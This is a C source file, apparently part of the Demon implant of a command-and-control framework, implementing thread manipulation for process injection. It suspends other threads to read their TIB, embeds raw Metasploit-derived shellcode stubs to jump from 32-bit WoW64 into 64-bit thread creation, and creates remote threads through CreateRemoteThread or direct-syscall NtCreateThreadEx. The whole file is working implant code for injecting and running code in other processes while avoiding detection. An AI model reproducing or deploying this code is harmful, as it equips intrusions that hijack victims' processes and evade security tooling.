#include <Demon.h>
#include <Common/Macros.h>
#include <Core/Thread.h>
#include <Core/MiniStd.h>
#include <Core/Memory.h>
#include <Core/SysNative.h>
#include <Core/Win32.h>

/*!
 * queries the NT_TIB from the specified leaked thread RSP address
 *
 * NOTE:
 *  this function is entirely taken from Austins Hudson's implementation.
 *  reference: https://github.com/realoriginal/titanldr-ng/blob/master/Obf.c#L215
 *
 * @param Adr leaked rsp address
 * @param Tib random tib
 * @return
 */
BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
) {
    THREAD_TEB_INFORMATION   ThdTebInfo = { 0 };
    MEMORY_BASIC_INFORMATION Memory1    = { 0 };
    MEMORY_BASIC_INFORMATION Memory2    = { 0 };
    CLIENT_ID                Client     = { 0 };
    CONTEXT                  ThdCtx     = { 0 };
    HANDLE                   ThdHndl    = NULL;
    HANDLE                   ThdNext    = NULL;
    BOOL                     Success    = FALSE;
    DWORD                    ThreadId   = 0;

    /* our current thread id */
    ThreadId            = U_PTR( Instance.Teb->ClientId.UniqueThread );
    ThdCtx.ContextFlags = CONTEXT_FULL;

    /* iterate over current process threads */
    while ( NT_SUCCESS( SysNtGetNextThread( NtCurrentProcess(), ThdHndl, THREAD_ALL_ACCESS, 0, 0, &ThdNext ) ) )
    {
        /* if the thread handle is valid close it */
        if ( ThdHndl ) {
            SysNtClose( ThdHndl );
        }

        /* set the next thread */
        ThdHndl = ThdNext;

        /* setup params we want to query */
        ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, ClientId );
        ThdTebInfo.BytesToRead    = sizeof( CLIENT_ID );
        ThdTebInfo.TebInformation = C_PTR( &Client );

        /* query information about the target thread */
        if ( NT_SUCCESS( SysNtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) )
        {
            /* if it's not our current thread then continue. */
            if ( ThreadId != U_PTR( Client.UniqueThread ) )
            {
                /* suspend target thread */
                if ( NT_SUCCESS( SysNtSuspendThread( ThdHndl, NULL ) ) )
                {
                    /* get target thread context  */
                    if ( NT_SUCCESS( SysNtGetContextThread( ThdHndl, &ThdCtx ) ) )
                    {
                        /* query memory info about rsp address */
#if _WIN64
                        if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Rsp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#else
                        if ( NT_SUCCESS( Instance.Win32.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Esp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#endif
                        {
                            /* query memory info about rsp address */
                            if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), Adr, MemoryBasicInformation, &Memory2, sizeof( Memory2 ), NULL ) ) )
                            {
                                /* check if it's the same region */
                                if ( U_PTR( Memory1.AllocationBase ) == U_PTR( Memory2.AllocationBase ) )
                                {
                                    /* setup params we want to query */
                                    ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, NtTib );
                                    ThdTebInfo.BytesToRead    = sizeof( NT_TIB );
                                    ThdTebInfo.TebInformation = C_PTR( Tib );

                                    /* Query information about the target thread */
                                    if ( NT_SUCCESS( SysNtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) ) {
                                        Success = TRUE;
                                    }
                                }
                            }
                        }
                    }

                    /* resume target thread */
                    SysNtResumeThread( ThdHndl, NULL );
                }
            }
        }

        /* did we successfully retrieve Tib ?
         * if yes then break loop. we got what we wanted */
        if ( Success ) {
            break;
        }
    }

    /* if the thread handle is valid close it */
    if ( ThdHndl ) {
        SysNtClose( ThdHndl );
        ThdHndl = NULL;
    }

    return Success;
}

#if _M_IX86

// https://github.com/rapid7/meterpreter/blob/5e309596e53ead0f64564fe77e0cad70908f6739/source/common/arch/win/i386/base_inject.c#L343
HANDLE ThreadCreateWoW64(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  PVOID  Entry,
    IN  PVOID  Arg
) {
    // TODO: define these arrays with HideChar or some other method
    /*
     * NOTE: migrate_executex64 was modified to include the instructions "mov ax, ds; mov ss, ax"
     *       which fixes a bizarre CPU bug described here http://blog.rewolf.pl/blog/?p=1484
     *       for reference: https://github.com/rapid7/metasploit-framework/blob/f17b28930dd926b93915a115f1117825f4c594db/external/source/shellcode/windows/x86/src/migrate/executex64.asm#L43-L44
     */
    BYTE migrate_executex64[] = "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
                                "\x58\x83\xC0\x2A\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
                                "\x89\x02\xE8\x0E\x00\x00\x00\x66\x8c\xd8\x8e\xd0\x83\xC4\x14\x5F"
                                "\x5E\x5D\xC2\x08\x00\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6"
                                "\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";
    BYTE migrate_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
                                "\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
                                "\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
                                "\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
                                "\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
                                "\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
                                "\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
                                "\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
                                "\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
                                "\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
                                "\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
                                "\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
                                "\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
                                "\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
                                "\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
                                "\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
                                "\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
                                "\x48\x83\xC4\x50\x48\x89\xFC\xC3";
    WOW64CONTEXT ctx          = { 0 };
    SIZE_T       Size         = 0;
    HANDLE       hThread      = NULL;
    EXECUTEX64   pExecuteX64  = NULL;
    X64FUNCTION  pX64function = NULL;

    ctx.h.hProcess       = Process;
    ctx.s.lpStartAddress = Entry;
    ctx.p.lpParameter    = Arg;
    ctx.t.hThread        = NULL;

    // allocate some memory for both shellcode stubs
    Size = sizeof( migrate_executex64 ) + sizeof(migrate_wownativex);
    if ( ! ( pExecuteX64 = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Size, PAGE_READWRITE ) ) ) {
        PUTS( "Failed allocating RW for migrate_executex64 and migrate_wownativex" )
        goto END;
    }

    // copy migrate_executex64
    MemCopy( pExecuteX64, &migrate_executex64, sizeof( migrate_executex64 ) );

    // copy migrate_wownativex
    pX64function = C_PTR( U_PTR( pExecuteX64 ) + sizeof( migrate_executex64 ) );
    MemCopy( pX64function, &migrate_wownativex, sizeof( migrate_wownativex ) );

    // switch RW to RX
    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), pExecuteX64, Size, PAGE_EXECUTE_READ ) ) ) {
        PUTS( "Failed to change memory protection" )
        goto END;
    }

    PUTS( "calling RtlCreateUserThread( ctx->h.hProcess, NULL, TRUE, 0, NULL, NULL, ctx->s.lpStartAddress, ctx->p.lpParameter, &ctx->t.hThread, NULL ) on x64 context" )
    if( ! pExecuteX64( pX64function, &ctx ) )
    {
        NtSetLastError( ERROR_ACCESS_DENIED );
        PUTS( "ThreadCreateWoW64 failed" )
        goto END;
    }

    if( ! ctx.t.hThread )
    {
        NtSetLastError( ERROR_INVALID_HANDLE );
        PUTS( "ThreadCreateWoW64: ctx->t.hThread is NULL" )
        goto END;
    }

    PUTS( "The thread was created" )

    hThread = ctx.t.hThread;

    // resume the thread which was created in suspended mode
    SysNtResumeThread( hThread, NULL );

END:
    if ( pExecuteX64 ) {
        MemoryFree( NtCurrentProcess(), pExecuteX64 );
    }

    return hThread;
}

#endif

HANDLE ThreadCreate(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  BOOL   x64,
    IN  PVOID  Entry,
    IN  PVOID  Arg,
    OUT PDWORD ThreadId
) {
    HANDLE Thread = NULL;

#if _M_IX86
    if ( x64 ) {
        // x86 -> x64
        return ThreadCreateWoW64( Method, Process, Entry, Arg );
    }
#endif

    switch ( Method )
    {
        case THREAD_METHOD_DEFAULT: {
            return ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, Process, x64, Entry, Arg, ThreadId );
        }

        case THREAD_METHOD_CREATEREMOTETHREAD: {
            Thread = Instance.Win32.CreateRemoteThread( Process, NULL, 0, Entry, Arg, 0, ThreadId );
            break;
        }

        case THREAD_METHOD_NTCREATEHREADEX: {
            NTSTATUS      NtStatus   = STATUS_SUCCESS;
            THD_ATTR_LIST ThreadAttr = { 0 };
            CLIENT_ID     Client     = { 0 };

            /* thread attribute to get the thread id*/
            ThreadAttr.Entry.Attribute = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
            ThreadAttr.Entry.Size      = sizeof( CLIENT_ID );
            ThreadAttr.Entry.pValue    = C_PTR( &Client );
            ThreadAttr.Length          = sizeof( PROC_THREAD_ATTRIBUTE_LIST );

            /* execute the code by creating a new thread */
            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process, Entry, Arg, FALSE, 0, 0, 0, &ThreadAttr );
            if ( NT_SUCCESS( NtStatus ) ) {
                if ( ThreadId ) {
                    *ThreadId = U_PTR( Client.UniqueThread );
                }
            } else {
                PRINTF( "Failed to create new thread => NtStatus:[%x]\n", NtStatus );
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }

            break;
        }

        case THREAD_METHOD_NTQUEUEAPCTHREAD: {
            /* TODO: finish implementing it */
            break;
        }

        default: {
            PRINTF( "Technique not found => %d", Method )
            break;
        }
    }

    return Thread;
}